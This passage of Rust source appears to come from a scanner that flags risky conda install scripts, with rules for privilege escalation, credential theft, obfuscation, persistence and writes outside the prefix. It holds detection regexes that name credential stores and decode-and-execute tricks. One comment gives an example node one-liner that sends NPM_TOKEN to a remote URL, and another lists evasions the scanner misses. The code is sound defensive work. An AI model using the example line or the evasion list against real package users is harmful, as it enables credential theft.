            "Attempts to run a command with elevated privileges; install scripts run as the installing user and should never escalate.",
        ));
    } else if RE_PRIV_SETUID.is_match(code) {
        out.push(hit(
            RULE_PRIV,
            ScriptSeverity::High,
            "Sets a setuid/setgid bit or file capability, which lets the file run with privileges other than the invoking user's.",
        ));
    } else if RE_PRIV_CHOWN.is_match(code) {
        out.push(hit(
            RULE_PRIV,
            ScriptSeverity::High,
            "Changes file ownership to root or an administrative group; this only succeeds with elevated privileges and has no place in a user-level install.",
        ));
    } else if RE_PRIV_WINDOWS.is_match(code) {
        out.push(hit(
            RULE_PRIV,
            ScriptSeverity::High,
            "Modifies accounts, sudoers, or ACLs in a way that grants privileges beyond the installing user.",
        ));
    }
}

// ----- credential-access ---------------------------------------------------

re!(
    RE_CRED_PATH,
    r#"(?i)(?:[\\/~]|\$\{?HOME\}?|%USERPROFILE%|\$env:USERPROFILE)[\\/]?\.(?:ssh|aws|gnupg|gpg|kube|azure|boto|s3cfg|git-credentials|netrc|npmrc|pypirc|password-store|terraform\.d|config[\\/]gcloud|docker[\\/]config\.json)(?:[\\/\s"';)]|$)|\b(?:id_(?:rsa|dsa|ecdsa|ed25519)|authorized_keys|_netrc|application_default_credentials\.json)\b|/etc/shadow\b|\.keychain(?:-db)?\b|\bsecurity\s+(?:find-(?:generic|internet)-password|dump-keychain|export)\b|\bcmdkey\s+/list\b|\bvaultcmd\b|\bmimikatz\b|\blsass\b"#
);
re!(
    RE_CRED_CONDARC,
    r#"(?i)(?:[\\/~]|\$\{?HOME\}?)[\\/]?\.condarc(?:[\s"';/\\)]|$)"#
);
/// Environment-variable names that by themselves say the value is a secret.
const SECRET_NAME: &str =
    r"(?:TOKEN|SECRET|PASSWORD|PASSWD|API_?KEY|CREDENTIALS?|PRIVATE_KEY|ACCESS_KEY)";

// `$GITHUB_TOKEN`, `${AWS_SECRET_ACCESS_KEY}`, `$env:API_KEY`, `%API_KEY%`.
re!(
    RE_CRED_ENV,
    concat_re!(
        r"\$\{?[A-Z0-9_]*",
        SECRET_NAME,
        r"[A-Z0-9_]*\}?|(?i:\$env:[A-Z0-9_]*",
        SECRET_NAME,
        r"[A-Z0-9_]*|%[A-Z0-9_]*",
        SECRET_NAME,
        r"[A-Z0-9_]*%)"
    )
);
re!(
    RE_CRED_ENV_DUMP,
    concat_re!(
        r"(?i)",
        CMD_START,
        r"(?:env|printenv)\s*(?:\||>)|\b(?:Get-ChildItem|gci|dir|ls)\s+env:"
    )
);

fn check_credential_access(code: &str, out: &mut Vec<Hit>) {
    if RE_CRED_PATH.is_match(code) {
        out.push(hit(
            RULE_CRED,
            ScriptSeverity::High,
            "Touches a well-known credential store (SSH/cloud/keychain/git credentials); an install script has no legitimate reason to read these.",
        ));
    } else if RE_CRED_CONDARC.is_match(code) {
        out.push(hit(
            RULE_CRED,
            ScriptSeverity::Medium,
            "Reads or writes the user's .condarc, which commonly holds private channel tokens.",
        ));
    } else if RE_CRED_ENV.is_match(code) {
        out.push(hit(
            RULE_CRED,
            ScriptSeverity::Medium,
            "Reads an environment variable that by name holds a token, secret, or password.",
        ));
    } else if RE_CRED_ENV_DUMP.is_match(code) {
        out.push(hit(
            RULE_CRED,
            ScriptSeverity::Medium,
            "Dumps the whole environment, which typically contains CI and cloud credentials.",
        ));
    }
}

// ----- obfuscation ---------------------------------------------------------

const DECODER: &str = r"(?:base64\s+(?:-\S+\s+)*(?:-d|-D|--decode)\b|base32\s+(?:-\S+\s+)*(?:-d|--decode)\b|openssl\s+(?:enc\s+)?(?:-\S+\s+)*-d\b|xxd\s+(?:-\S+\s+)*-r\b|uudecode\b|b64decode\s*\(|FromBase64String\s*\(|certutil(?:\.exe)?\s+(?:-\S+\s+)*-decode\b)";
// Decompressing bundled data is routine; it only matters when the output is executed.
const DECOMPRESS: &str = r"(?:(?:gunzip|zcat|bzcat|xzcat|unxz|bunzip2)\b|gzip\s+-\S*d\S*\b)";
re!(RE_OBF_DECODER, concat_re!(r"(?i)", DECODER));
re!(
    RE_OBF_DECODE_EXEC,
    concat_re!(
        r"(?i)(?:",
        DECODER,
        r"|",
        DECOMPRESS,
        r")[^|]*(?:\|[^|]*)*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:\S*/)?",
        INTERP,
        r"\b|\b(?:sh|bash|zsh|eval|source|exec)\s+(?:-[a-z]+\s+)*[\x22']?(?:\$\(|`|<\().*(?:",
        DECODER,
        r"|",
        DECOMPRESS,
        r")|\b(?:exec|eval|iex|Invoke-Expression)\b.*",
        DECODER
    )
);
re!(
    RE_OBF_ENCODED_CMD,
    r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b.*\s-(?:e|ec|enc|encodedcommand)\s+[A-Za-z0-9+/=]{8,}"
);
re!(RE_OBF_HIDDEN, r"(?i)\s-w(?:indowstyle)?\s+hidden\b");
re!(
    RE_OBF_ESCAPES,
    r"(?:\\x[0-9a-fA-F]{2}){8,}|(?:\\[0-7]{3}){8,}|(?:\\u[0-9a-fA-F]{4}){8,}|(?:0x[0-9a-fA-F]{2}\s*,\s*){12,}|(?:\[char\]\s*\d+\s*[+,]\s*){4,}"
);
re!(
    RE_OBF_EXEC_ESCAPES,
    r"(?i)\b(?:eval|exec|sh|bash|source|iex|Invoke-Expression)\b.*(?:\\x[0-9a-fA-F]{2}){4,}|(?:\\x[0-9a-fA-F]{2}){4,}.*\|\s*(?:sudo\s+)?(?:\S*/)?(?:sh|bash|zsh|python[0-9.]*|perl)\b"
);
re!(RE_OBF_EVAL_DYNAMIC, r"\beval\s+(?:-\S+\s+)*[\x22']?\$");
// `$(printf "\143\165\162\154")` used as a command name.
re!(
    RE_OBF_CMD_FROM_ESCAPES,
    r"(?:\$\(|`)\s*printf\s+(?:-\S+\s+)*[\x22']?(?:\\[0-7]{3}|\\x[0-9a-fA-F]{2})"
);
// `cu""rl`: empty quotes spliced into a word to defeat string matching.
re!(RE_OBF_QUOTE_SPLICE, r#"[A-Za-z](?:""|'')[A-Za-z]"#);
re!(RE_OBF_BLOB, r"[A-Za-z0-9+/]{120,}={0,2}");

/// A long run of base64-alphabet characters is only a blob if it looks like
/// encoded data rather than a long path or identifier.
fn looks_like_blob(s: &str) -> bool {
    let mut upper = 0usize;
    let mut lower = 0usize;
    let mut digit = 0usize;
    let mut slash = 0usize;
    for c in s.chars() {
        if c.is_ascii_uppercase() {
            upper += 1;
        } else if c.is_ascii_lowercase() {
            lower += 1;
        } else if c.is_ascii_digit() {
            digit += 1;
        } else if c == '/' {
            slash += 1;
        }
    }
    let len = s.len().max(1);
    upper > 0 && lower > 0 && digit > 0 && slash * 20 < len
}

fn check_obfuscation(flavor: Flavor, code: &str, out: &mut Vec<Hit>) {
    if RE_OBF_DECODE_EXEC.is_match(code) || RE_OBF_CMD_FROM_ESCAPES.is_match(code) {
        out.push(hit(
            RULE_OBFUSCATION,
            ScriptSeverity::High,
            "Decodes or decompresses data and executes the result; the real payload is hidden from anyone reading the script.",
        ));
    } else if RE_OBF_ENCODED_CMD.is_match(code) {
        out.push(hit(
            RULE_OBFUSCATION,
            ScriptSeverity::High,
            "Runs PowerShell with an -EncodedCommand payload, hiding the actual command from review.",
        ));
    } else if RE_OBF_EXEC_ESCAPES.is_match(code) {
        out.push(hit(
            RULE_OBFUSCATION,
            ScriptSeverity::High,
            "Builds a command from hex escape sequences and executes it, hiding the real command from review.",
        ));
    } else if RE_OBF_BLOB
        .find_iter(code)
        .any(|m| looks_like_blob(m.as_str()))
    {
        out.push(hit(
            RULE_OBFUSCATION,
            ScriptSeverity::High,
            "Contains a long base64-like blob; embedded encoded payloads in an install script are a strong indicator of hidden code.",
        ));
    } else if RE_OBF_ESCAPES.is_match(code) {
        out.push(hit(
            RULE_OBFUSCATION,
            ScriptSeverity::High,
            "Contains a long run of hex/octal escape sequences or a byte array, typical of an encoded payload.",
        ));
    } else if RE_OBF_DECODER.is_match(code) {
        out.push(hit(
            RULE_OBFUSCATION,
            ScriptSeverity::Medium,
            "Decodes base64/hex or decompresses data at install time; check what the decoded output is used for.",
        ));
    } else if RE_OBF_EVAL_DYNAMIC.is_match(code) {
        out.push(hit(
            RULE_OBFUSCATION,
            ScriptSeverity::Medium,
            "eval of a dynamically constructed string; the executed command is not visible in the script text.",
        ));
    } else if RE_OBF_HIDDEN.is_match(code) {
        out.push(hit(
            RULE_OBFUSCATION,
            ScriptSeverity::Medium,
            "Launches a hidden window, which is only useful for keeping activity out of the user's sight.",
        ));
    } else if flavor == Flavor::Shell && RE_OBF_QUOTE_SPLICE.is_match(code) {
        out.push(hit(
            RULE_OBFUSCATION,
            ScriptSeverity::Medium,
            "Splices empty quotes into a word (e.g. cu\"\"rl), a trick used to defeat pattern matching.",
        ));
    }
}

// ----- persistence ---------------------------------------------------------

// Absolute system paths are anchored at a token start so that
// `$PREFIX/lib/systemd/user/...` (inside the prefix) does not match.
re!(
    RE_PERSIST_PATH,
    r#"(?i)(?:^|[\s"'=(])(?:/etc/cron(?:tab|\.d|\.daily|\.hourly|\.weekly|\.monthly)\b|/var/spool/cron\b|/etc/systemd/|/(?:usr/)?lib/systemd/|/etc/init\.d/|/etc/rc\d?\.d/|/etc/rc\.local\b|/etc/ld\.so\.preload\b|/etc/profile\.d/|/etc/profile\b|/etc/bash\.bashrc\b|/etc/zsh(?:rc|env)?\b|/etc/xdg/autostart\b|/Library/(?:LaunchAgents|LaunchDaemons|StartupItems)\b)|(?:~|\$\{?HOME\}?|\$env:USERPROFILE|%USERPROFILE%)[/\\](?:\.config/systemd/|\.config/autostart\b|Library/Launch(?:Agents|Daemons)\b)|CurrentVersion\\+(?:Run|RunOnce|RunServices|RunServicesOnce|Winlogon|Explorer\\+Shell Folders|Image File Execution Options)\b|Start Menu\\+Programs\\+Startup\b|shell:startup\b"#
);
re!(
    RE_PERSIST_CMD,
    r"(?i)\bsystemctl\s+(?:--user\s+)?(?:enable|start|restart|daemon-reload|link|edit)\b|\blaunchctl\s+(?:load|bootstrap|enable|submit)\b|\bupdate-rc\.d\b|\bchkconfig\s+\S+\s+on\b|\bschtasks(?:\.exe)?\s+/create\b|\b(?:New|Register)-ScheduledTask\b|\b(?:New|Set)-Service\b|\bsc(?:\.exe)?\s+(?:create|config)\b|\bwmic\b.*\bstartup\b|(?:^|[;&|(`])\s*(?:nohup|setsid|disown)\b|\bStart-Process\b.*-WindowStyle\s+Hidden\b|\bat\s+(?:now|\d{1,2}:\d{2})\b"
);
re!(RE_PERSIST_CRONTAB, r"\bcrontab\b\s*(\S*)");
// Shell/PowerShell profile files: only a hit when the line also writes.
re!(
    RE_PERSIST_RC_FILE,
    r"(?i)(?:[\\/~]|\$\{?HOME\}?)[\\/]?\.(?:bashrc|bash_profile|bash_login|bash_logout|profile|zshrc|zprofile|zshenv|zlogin|cshrc|tcshrc|kshrc|xinitrc|xsession|xprofile|config[\\/]fish[\\/]config\.fish)\b|\$PROFILE\b|\$env:USERPROFILE\\+Documents\\+(?:Windows)?PowerShell\b"
);
re!(
    RE_WRITE_OP,
    r"(?i)(?:^|[^<>|&])>{1,2}|\b(?:tee|cp|mv|ln|install|sed\s+-i|perl\s+-i|Add-Content|Set-Content|Out-File|Copy-Item|Move-Item|New-Item)\b"
);

fn check_persistence(code: &str, out: &mut Vec<Hit>) {
    if RE_PERSIST_PATH.is_match(code) || RE_PERSIST_CMD.is_match(code) {
        out.push(hit(
            RULE_PERSISTENCE,
            ScriptSeverity::Medium,
            "Registers something to run again later (cron, service, launch agent, autostart, startup key, or a detached process); install scripts should not outlive the install.",
        ));
        return;
    }
    if let Some(caps) = RE_PERSIST_CRONTAB.captures(code) {
        if caps[1] != *"-l" {
            out.push(hit(
                RULE_PERSISTENCE,
                ScriptSeverity::Medium,
                "Installs a crontab, which keeps running code after the install completes.",
            ));
            return;
        }
    }
    if RE_PERSIST_RC_FILE.is_match(code) && RE_WRITE_OP.is_match(code) {
        out.push(hit(
            RULE_PERSISTENCE,
            ScriptSeverity::Medium,
            "Modifies a shell or PowerShell profile so that code runs in every future interactive session.",
        ));
    }
}

// ----- writes-outside-prefix -----------------------------------------------

// `> path`, `>> path`, `>| path`, `&> path`; `>&2` and `2>&1` do not capture.
re!(RE_REDIRECT, r"(?:^|[^<>|])&?>{1,2}\|?\s*([^\s;&|)<>]+)");
// Commands where every non-flag argument is a write target.
re!(
    RE_WRITE_ALL_ARGS,
    concat_re!(
        r"(?i)",
        CMD_START,
        r"(mkdir|md|touch|rm|rmdir|rd|unlink|del|erase|chmod|chown|chgrp|truncate|tee|mklink|attrib|icacls|reg(?:\.exe)?\s+(?:add|delete|import|restore|load|copy)|New-Item|Set-Content|Add-Content|Out-File|Remove-Item|Rename-Item|Set-ItemProperty|New-ItemProperty|Remove-ItemProperty|Clear-Content)(?:\s+(.*))?$"
    )
);
// Commands where only the final argument is the write target.
re!(
    RE_WRITE_LAST_ARG,
    concat_re!(
        r"(?i)",
        CMD_START,
        r"(cp|mv|install|ln|rsync|copy|xcopy|move|robocopy|Copy-Item|Move-Item)\s+(.*)$"
    )
);
re!(
    RE_WRITE_SED_INPLACE,
    r"(?:^|[\s;&|(`])(?:sed|perl)\s+(?:-\S+\s+)*-[a-zA-Z]*i"
);
re!(RE_WRITE_DD, r"\bdd\b.*\bof=(\S+)");
re!(
    RE_RECURSIVE_DELETE,
    r"(?i)\brm\s+(?:-\S+\s+)*-[a-z]*r|\bRemove-Item\b.*-Recurse\b|\b(?:rd|rmdir)\s+/s\b"
);
re!(
    RE_WRITE_SYSTEM_CMD,
    r"(?i)(?:^|[;&|(`]|\bsudo\s+)\s*(?:ldconfig|defaults\s+write|update-desktop-database|update-mime-database|gtk-update-icon-cache|xdg-(?:mime|desktop-menu|icon-resource)\s+(?:default|install)|mandb|update-alternatives\s+--install)\b"
);
re!(
    RE_WRITE_TRUST_STORE,
    r"(?i)\bupdate-ca-(?:certificates|trust)\b|\bcertutil(?:\.exe)?\b.*-addstore\b|\bsecurity\s+add-trusted-cert\b|\btrust\s+anchor\b|\bImport-Certificate\b|\bImport-PfxCertificate\b"
);
re!(
    RE_WRITE_USER_INSTALL,
    r"\b(?:kernelspec|nbextension|serverextension|labextension|pip[0-9.]*)\b[^|;&]*--user\b"
);

/// Classifies a path-like token. Returns an explanation if the path is
/// outside the conda prefix, `None` if it is inside `$PREFIX`, a temp
/// location, `/dev/null`, a relative path, or unknowable (`$SOME_VAR/...`).
fn outside_prefix_target(token: &str) -> Option<(ScriptSeverity, &'static str)> {
    let t = token.trim_matches(|c: char| {
        c == '"' || c == '\'' || c == '(' || c == ')' || c == ',' || c == ';'
    });
    let t = t.strip_prefix("$'").unwrap_or(t);
    if t.is_empty() {
        return None;
    }
    let upper = t.to_ascii_uppercase();

    // Home directory forms.
    if t.starts_with('~') {
        return Some((
            ScriptSeverity::Medium,
            "Writes into the user's home directory",
        ));
    }
    for v in [
        "HOME",
        "USERPROFILE",
        "HOMEPATH",
        "XDG_CONFIG_HOME",
        "XDG_DATA_HOME",
        "XDG_CACHE_HOME",
        "XDG_STATE_HOME",
    ] {
        if upper.starts_with(&format!("${v}")) || upper.starts_with(&format!("${{{v}")) {
            return Some((
                ScriptSeverity::Medium,
                "Writes into the user's home directory",
            ));
        }
    }

    // Windows environment forms: `%NAME%`, `$env:NAME`.
    const WIN_SYSTEM: &[&str] = &[
        "APPDATA",
        "LOCALAPPDATA",
        "PROGRAMFILES",
        "PROGRAMFILES(X86)",
        "PROGRAMW6432",
        "PROGRAMDATA",
        "SYSTEMROOT",
        "WINDIR",
        "ALLUSERSPROFILE",
        "PUBLIC",
        "SYSTEMDRIVE",
        "COMMONPROGRAMFILES",
        "COMMONPROGRAMFILES(X86)",
        "HOMEDRIVE",
    ];
    if let Some(rest) = upper
        .strip_prefix('%')
        .or_else(|| upper.strip_prefix("$ENV:"))
    {
        if rest.starts_with("USERPROFILE") || rest.starts_with("HOMEPATH") {
            return Some((
                ScriptSeverity::Medium,
                "Writes into the user's home directory",
            ));
        }
        if WIN_SYSTEM.iter().any(|v| rest.starts_with(v)) {
            return Some((
                ScriptSeverity::Medium,
                "Writes into a Windows system or profile directory outside %PREFIX%",
            ));
        }
        return None;
    }

    // Registry.
    if ["HKLM", "HKCU", "HKCR", "HKU", "HKCC", "HKEY_"]
        .iter()
        .any(|p| upper.starts_with(p))
    {
        return Some((
            ScriptSeverity::Medium,
            "Writes to the Windows registry, which is outside the conda prefix",
        ));
    }

    // POSIX absolute paths.
    if t.starts_with('/') {
        const BLOCK_DEVICES: &[&str] = &[
            "/dev/sd",
            "/dev/hd",
            "/dev/nvme",
            "/dev/disk",
            "/dev/mmcblk",
            "/dev/xvd",
            "/dev/vd",
            "/dev/mapper/",
            "/dev/mem",
            "/dev/kmem",
        ];
        if BLOCK_DEVICES.iter().any(|p| t.starts_with(p)) {
            return Some((
                ScriptSeverity::High,
                "Writes directly to a block device or kernel memory",
            ));
        }
        const IGNORED: &[&str] = &[
            "/tmp",
            "/var/tmp",
            "/private/tmp",
            "/private/var/tmp",
            "/var/folders/",
            "/dev/",
            "/proc/",
            "/sys/",
        ];
        let ignored = IGNORED.iter().any(|p| {
            t == p.trim_end_matches('/')
                || t.starts_with(p)
                || t.starts_with(&format!("{}/", p.trim_end_matches('/')))
        });
        if ignored {
            return None;
        }
        return Some((
            ScriptSeverity::Medium,
            "Writes to an absolute system path outside the conda prefix",
        ));
    }

    // Windows drive letters and UNC paths.
    let b = t.as_bytes();
    if b.len() >= 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && (b[2] == b'\\' || b[2] == b'/')
    {
        return Some((
            ScriptSeverity::Medium,
            "Writes to a fixed drive path outside the conda prefix",
        ));
    }
    if t.starts_with("\\\\") {
        return Some((
            ScriptSeverity::Medium,
            "Writes to a UNC network path outside the conda prefix",
        ));
    }
    None
}

/// Cuts an argument string at the first command separator.
fn first_command(args: &str) -> &str {
    let end = args.find([';', '|', '&']).unwrap_or(args.len());
    &args[..end]
}

/// Splits an argument string on whitespace, keeping quoted spans (minus the
/// quotes) together so `"C:\\Program Files\\x"` is one token.
fn split_args(args: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut has_token = false;
    for c in args.chars() {
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
                has_token = true;
            }
            '"' if !in_single => {
                in_double = !in_double;
                has_token = true;
            }
            c if c.is_whitespace() && !in_single && !in_double => {
                if has_token {
                    out.push(std::mem::take(&mut cur));
                    has_token = false;
                }
            }
            c => {
                cur.push(c);
                has_token = true;
            }
        }
    }
    if has_token {
        out.push(cur);
    }
    out
}

/// `-x`, `--long`, or a batch-style `/s` switch. A bare `/` is a path.
fn is_flag(tok: &str) -> bool {
    tok.starts_with('-')
        || (tok.len() >= 2
            && tok.len() <= 3
            && tok.starts_with('/')
            && tok[1..].chars().all(|c| c.is_ascii_alphabetic()))
}

fn check_writes_outside_prefix(flavor: Flavor, code: &str, out: &mut Vec<Hit>) {
    let mut explanation: Option<(ScriptSeverity, &'static str)> = None;

    for caps in RE_REDIRECT.captures_iter(code) {
        if let Some(e) = outside_prefix_target(&caps[1]) {
            explanation = Some(e);
            break;
        }
    }

    if explanation.is_none() {
        if let Some(caps) = RE_WRITE_ALL_ARGS.captures(code) {
            let args = caps.get(2).map(|m| m.as_str()).unwrap_or("");
            explanation = split_args(first_command(args))
                .iter()
                .filter(|t| !is_flag(t))
                .find_map(|t| outside_prefix_target(t));
        }
    }

    if explanation.is_none() {
        if let Some(caps) = RE_WRITE_LAST_ARG.captures(code) {
            let cmd = caps[1].to_ascii_lowercase();
            let args = first_command(&caps[2]);
            let tokens: Vec<String> = split_args(args)
                .into_iter()
                .filter(|t| !is_flag(t))
                .collect();
            // PowerShell cmdlets take named parameters in any order, so every
            // argument is a candidate there; POSIX/batch copies target the last.
            let candidates: Vec<String> = if cmd.starts_with("copy-")
                || cmd.starts_with("move-")
                || flavor == Flavor::PowerShell
            {
                tokens
            } else {
                tokens.last().cloned().into_iter().collect()
            };
            explanation = candidates.iter().find_map(|t| outside_prefix_target(t));
        }
    }

    if explanation.is_none() && RE_WRITE_SED_INPLACE.is_match(code) {
        explanation = split_args(first_command(code))
            .iter()
            .skip(1)
            .filter(|t| !is_flag(t))
            .find_map(|t| outside_prefix_target(t));
    }

    if explanation.is_none() {
        if let Some(caps) = RE_WRITE_DD.captures(code) {
            explanation = outside_prefix_target(&caps[1]);
        }
    }

    if let Some((severity, e)) = explanation {
        if RE_RECURSIVE_DELETE.is_match(code) {
            out.push(hit(
                RULE_WRITES,
                ScriptSeverity::High,
                "Recursively deletes a location outside the conda prefix.",
            ));
        } else {
            out.push(hit(RULE_WRITES, severity, e));
        }
        return;
    }

    if RE_WRITE_TRUST_STORE.is_match(code) {
        out.push(hit(
            RULE_WRITES,
            ScriptSeverity::High,
            "Installs a certificate into the system trust store, which affects every TLS connection on the machine.",
        ));
    } else if RE_WRITE_SYSTEM_CMD.is_match(code) {
        out.push(hit(
            RULE_WRITES,
            ScriptSeverity::Medium,
            "Updates a system-wide cache or preference database outside the conda prefix.",
        ));
    } else if RE_WRITE_USER_INSTALL.is_match(code) {
        out.push(hit(
            RULE_WRITES,
            ScriptSeverity::Medium,
            "Installs into the user's home directory (--user) instead of the conda prefix.",
        ));
    }
}

// ---------------------------------------------------------------------------
// Nested interpreters
// ---------------------------------------------------------------------------
//
// A hook can hand a whole program to a second interpreter on one line:
//
//     node -e "require('https').get('https://x/?t='+process.env.NPM_TOKEN)"
//
// Every rule above is written for shell, so a line like that reads as one
// unremarkable `node` invocation and nothing matches. The code here pulls the
// embedded body out of such an invocation and analyses it: a shell body goes
// back through the same engine, and a scripting-language body gets the small
// rule set below.
//
// Findings are reported against the outer line, which is where a reviewer
// will look.
//
// What this deliberately does not reach, so that nobody reads a clean result
// as proof of absence:
//
//   * A name assembled inside the embedded body: `require('ht'+'tps')`,
//     `getattr(__import__('o'+'s'), 'system')`. The patterns match literal
//     API names only.
//   * An interpreter named through a variable: `"$PYTHON" -c ...`,
//     `$NODE -e ...`. Resolving those would also fire on
//     `"$PYTHON" -m compileall`, which is in the benign corpus.
//   * Code arriving on stdin from a pipe: `echo '<code>' | node`. Reaching it
//     means undoing the `echo` masking that keeps the corpus silent; the
//     `<downloader> | <interpreter>` form is already remote-code-execution.
//   * `python -m <module>`: no inline code to extract. The risky targets are
//     already covered elsewhere (`python -m pip install`), and separating the
//     rest from `-m compileall` needs a module list that cannot be made
//     precise.
//   * A write whose target is computed: `fs.writeFileSync(path.join(
//     os.homedir(), '.bashrc'), p)`. Only a literal first argument is
//     classified.
//   * Anything past the limits below: deeper nesting, more inline
//     invocations on one line, or a longer body.

/// How deep extraction recurses. A hook can nest `sh -c` inside `sh -c`
/// without limit; three levels covers what real payloads do and bounds the
/// work on adversarial input.
const MAX_NEST_DEPTH: usize = 3;
/// Inline invocations examined per line.
const MAX_NESTED_PER_LINE: usize = 4;
/// Characters of an embedded body that are analysed.
const MAX_NESTED_BODY_CHARS: usize = 16 * 1024;
/// Tokens scanned after an interpreter name while looking for its code flag.
const MAX_NESTED_SCAN_TOKENS: usize = 16;
/// Lines of an embedded shell body that are analysed.
const MAX_NESTED_LINES: usize = 64;
/// Longest `-EncodedCommand` argument that is decoded.
const MAX_ENCODED_CHARS: usize = 64 * 1024;

/// How the body of an inline invocation should be analysed.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum NestedLang {
    /// Shell source: recurse through the shell rules.
    Shell,
    /// PowerShell source: recurse through the rules in PowerShell flavor.
    PowerShell,
    /// JavaScript, Python or PHP: use the embedded-code rules.
    Script,
    /// Ruby or Perl: as [`NestedLang::Script`], plus backticks run a shell
    /// command in those two languages.
    ScriptWithBackticks,
}

/// An interpreter that accepts a program as a command-line argument.
struct Interpreter {
    /// Lowercase command basenames, `.exe` already stripped.
    names: &'static [&'static str],
    /// Lowercase flags whose next argument is inline code.
    flags: &'static [&'static str],
    /// When set, a bundled short-flag group ending in this letter (`-xec`,
    /// `-ne`) also introduces inline code.
    bundle_suffix: Option<char>,
    /// Lowercase flags whose next argument is base64 inline code.
    encoded_flags: &'static [&'static str],
    lang: NestedLang,
}

const INTERPRETERS: &[Interpreter] = &[
    Interpreter {
        names: &["sh", "bash", "zsh", "dash", "ksh", "ash"],
        flags: &["-c"],
        bundle_suffix: Some('c'),
        encoded_flags: &[],
        lang: NestedLang::Shell,
    },
    Interpreter {
        names: &["pwsh", "powershell"],
        flags: &["-command", "-c"],
        bundle_suffix: None,
        // PowerShell accepts unambiguous prefixes of -EncodedCommand.
        encoded_flags: &["-encodedcommand", "-enc", "-ec", "-e"],
        lang: NestedLang::PowerShell,
    },
    Interpreter {
        names: &["node", "nodejs"],
        flags: &["-e", "--eval", "-p", "--print"],
        bundle_suffix: None,
        encoded_flags: &[],
        lang: NestedLang::Script,
    },
    // `python`, `python3`, `python3.11`; see `interpreter_for`.
    Interpreter {
        names: &["python"],
        flags: &["-c"],
        bundle_suffix: Some('c'),
        encoded_flags: &[],
        lang: NestedLang::Script,
    },
    Interpreter {
        names: &["php"],
        flags: &["-r"],
        bundle_suffix: None,
        encoded_flags: &[],
        lang: NestedLang::Script,
    },
    Interpreter {
        names: &["ruby", "perl"],
        flags: &["-e"],
        bundle_suffix: Some('e'),
        encoded_flags: &[],
        lang: NestedLang::ScriptWithBackticks,
    },
];

/// Words that keep the following token in command position.
const NESTED_WRAPPERS: &[&str] = &[
    "sudo", "doas", "env", "exec", "nohup", "command", "time", "xargs", "nice", "then", "do",
    "else", "if", "elif", "while", "until", "setsid", "busybox",
];

// Cheap pre-filter: an interpreter name immediately followed by a flag. Lines
// that fail this are never tokenised, which keeps the cost off the 99% of
// lines that cannot contain an inline program.
re!(
    RE_NEST_GATE,
    r"(?i)\b(?:sh|bash|zsh|dash|ksh|ash|pwsh|powershell|node|nodejs|python[0-9.]*|ruby|perl|php)(?:\.exe)?[\x22']?\s+-"
);

/// Returns the interpreter for a command token, or `None`.
fn interpreter_for(token: &str) -> Option<&'static Interpreter> {
    let lower = token
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(token)
        .to_ascii_lowercase();
    let base = lower.strip_suffix(".exe").unwrap_or(lower.as_str());
    INTERPRETERS.iter().find(|i| {
        i.names.iter().any(|n| {
            base == *n
                // `python3`, `python3.11`.
                || (*n == "python"
                    && base.starts_with("python")
                    && base[6..].chars().all(|c| c.is_ascii_digit() || c == '.'))
        })
    })
}

/// True when `tok` is a flag whose next argument is inline code.
fn is_code_flag(interp: &Interpreter, tok: &str) -> bool {
    let lower = tok.to_ascii_lowercase();
    if interp.flags.contains(&lower.as_str()) {
        return true;
    }
    match interp.bundle_suffix {
        Some(suffix) => {
            lower.len() > 2
                && lower.starts_with('-')
                && !lower.starts_with("--")
                && lower.ends_with(suffix)
                && lower[1..].chars().all(|c| c.is_ascii_alphabetic())
        }
        None => false,
    }
}

/// One token of a command line, with enough context to tell a command name
/// from an argument.
struct Token {
    /// Quotes removed and escapes resolved.
    text: String,
    /// Came from a quoted span, so it is a literal and never a command name.
    quoted: bool,
    /// `;`, `|`, `&`, `(` or `)`: ends the current command.
    separator: bool,
}

fn push_token(out: &mut Vec<Token>, cur: &mut String, started: &mut bool, quoted: &mut bool) {
    if *started {
        out.push(Token {
            text: std::mem::take(cur),
            quoted: *quoted,
            separator: false,
        });
    }
    cur.clear();
    *started = false;
    *quoted = false;
}

/// Splits a line into tokens, resolving one level of quoting so that the
/// argument of `-c` comes back as the program it really is.
fn tokenize(flavor: Flavor, code: &str) -> Vec<Token> {
    // Batch has no escape character; `\` there is a path separator.
    let escape = match flavor {
        Flavor::Shell => Some('\\'),
        Flavor::PowerShell => Some('`'),
        Flavor::Batch => None,
    };
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut started = false;
    let mut quoted = false;
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = code.chars().peekable();
    while let Some(c) = chars.next() {
        if Some(c) == escape && !in_single {
            // Inside double quotes a backslash only escapes a few characters.
            let escapes_next = match chars.peek() {
                Some(&n) => !in_double || matches!(n, '"' | '\\' | '$' | '`'),
                None => false,
            };
            if escapes_next {
                if let Some(n) = chars.next() {
                    cur.push(n);
                    started = true;
                }
                continue;
            }
        }
        if c == '\'' && !in_double {
            in_single = !in_single;
            started = true;
            quoted = true;
            continue;
        }
        if c == '"' && !in_single {
            in_double = !in_double;
            started = true;
            quoted = true;
            continue;
        }
        if in_single || in_double {
            cur.push(c);
            started = true;
            continue;
        }
        if c.is_whitespace() {
            push_token(&mut out, &mut cur, &mut started, &mut quoted);
            continue;
        }
        if matches!(c, ';' | '|' | '&' | '(' | ')') {
            push_token(&mut out, &mut cur, &mut started, &mut quoted);
            out.push(Token {
                text: c.to_string(),
                quoted: false,
                separator: true,
            });
            continue;
        }
        cur.push(c);
        started = true;
    }
    push_token(&mut out, &mut cur, &mut started, &mut quoted);
    out
}

/// The program that follows a code flag. A quoted argument is the whole
/// program; an unquoted one runs to the next command separator.
fn join_body(tokens: &[Token], start: usize) -> Option<String> {
    let first = tokens.get(start)?;
    if first.separator {
        return None;
    }
    if first.quoted {
        return Some(first.text.clone());
    }
    let mut body = first.text.clone();
    for t in tokens[start + 1..].iter().take(MAX_NESTED_SCAN_TOKENS) {
        if t.separator {
            break;
        }
        body.push(' ');
        body.push_str(&t.text);
    }
    Some(body)
}

fn truncate_chars(s: &str, max: usize) -> String {
    match s.char_indices().nth(max) {
        Some((i, _)) => s[..i].to_owned(),
        None => s.to_owned(),
    }
}

/// Decodes a PowerShell `-EncodedCommand` argument, which is base64 over
/// UTF-16LE.
fn decode_encoded_command(arg: &str) -> Option<String> {
